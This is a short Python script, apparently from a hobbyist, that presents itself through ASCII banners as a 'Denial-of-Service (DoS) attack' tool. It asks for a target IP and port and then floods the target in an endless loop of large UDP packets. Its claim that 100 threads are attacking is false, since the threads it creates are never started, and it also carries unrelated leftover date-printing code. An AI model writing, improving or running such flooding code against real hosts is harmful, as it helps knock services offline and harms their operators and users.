import threading
import time
import socket
import concurrent.futures
import datetime
import json

ips = {

}

f = ips.values()
g = ips.keys()
h = ips.items()
print(json.dumps(ips, indent=2, sort_keys=True))
print(type(ips))
print(len(ips))
y = datetime.datetime.now()
print("Date:")
print(y)
print("Year:")
print(y.year)
print("Day:")
print(y.strftime("%A"))
print("Month:")
print(y.strftime("%B"))

print("""

#-=======--=======-------#
|Created by TheGhostRoot |
#-------=====-----=====--#

 /$$      /$$           /$$$$$$$   /$$$$$$   /$$$$$$
| $$$    /$$$          | $$__  $$ /$$__  $$ /$$__  $$
| $$$$  /$$$$  /$$$$$$ | $$  \ $$| $$  \ $$| $$  \__/
| $$ $$/$$ $$ /$$__  $$| $$  | $$| $$  | $$|  $$$$$$
| $$  $$$| $$| $$  \__/| $$  | $$| $$  | $$ \____  $$
| $$\  $ | $$| $$      | $$  | $$| $$  | $$ /$$  \ $$
| $$ \/  | $$| $$      | $$$$$$$/|  $$$$$$/|  $$$$$$/
|__/     |__/|__/      |_______/  \______/  \______/

+-----===========--========------+
| Denial-of-Service (DoS) attack |
+---====------==================-+

""")

ip = input("[+} Target IP: ")
print(" <+> This is the target IP " + ip + ' <+> ')
time.sleep(1)
port = int(input("[+} Target open port: "))
print(port)
time.sleep(1)

print("""

 /$$   /$$                     /$$       /$$
| $$  | $$                    | $$      |__/
| $$  | $$  /$$$$$$   /$$$$$$$| $$   /$$ /$$ /$$$$$$$   /$$$$$$
| $$$$$$$$ |____  $$ /$$_____/| $$  /$$/| $$| $$__  $$ /$$__  $$
| $$__  $$  /$$$$$$$| $$      | $$$$$$/ | $$| $$  \ $$| $$  \ $$
| $$  | $$ /$$__  $$| $$      | $$_  $$ | $$| $$  | $$| $$  | $$
| $$  | $$|  $$$$$$$|  $$$$$$$| $$ \  $$| $$| $$  | $$|  $$$$$$$
|__/  |__/ \_______/ \_______/|__/  \__/|__/|__/  |__/ \____  $$
                                                       /$$  \ $$
                                                      |  $$$$$$/
                                                       \______/

""")


def dos(packet):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(" <+> 68 MB per second (1000 packets per second) / you can change this! / 65501 bytes per packet <+> ")
    time.sleep(2)
    print(' <+> 100 threads are attacking! <+> ')
    time.sleep(2)
    x = 0
    sent = 0
    while True:
        client.sendto(packet, (ip, port))
        x += 65501
        sent += 1
        txt = " <> Sended {} packets, bytes sended {} to {} : {} <> "
        print(txt.format(sent, x, ip, port))


# max range 10000 for pc or there is a chance your device to crash.
# max range 200 for phones or your device will crach.
for i in range(100):
    threading.Thread(target=dos)
dos(bytearray(65501))
